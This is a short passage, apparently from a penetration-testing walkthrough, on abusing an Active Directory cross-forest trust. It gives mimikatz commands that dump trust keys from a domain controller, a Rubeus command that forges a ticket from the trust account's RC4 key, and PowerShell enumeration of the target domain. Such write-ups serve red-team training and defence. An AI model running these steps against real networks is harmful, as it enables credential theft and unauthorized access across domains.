## Cross-Forest Trust Ticket
With SYSTEM on DC01, let’s look at domain trusts:

```text
mimikatz.exe "lsadump::trust /patch" exit
```

Output shows a one-way trust: `<TRUSTING_DOMAIN>` trusts `<TRUSTED_DOMAIN>`. We can use the trust key to request tickets in the other domain.

```text
Rubeus.exe asktgt /user:<Domain-Name>$ /domain:<Target_DOMAIN> /rc4:<TRUST_RC4_KEY> /nowrap /ptt
```

Now we can query `<TARGET_DOMAIN>`:

```powershell
Get-ADUser -Filter * -Server <TARGET_DC> | Select SamAccountName
```
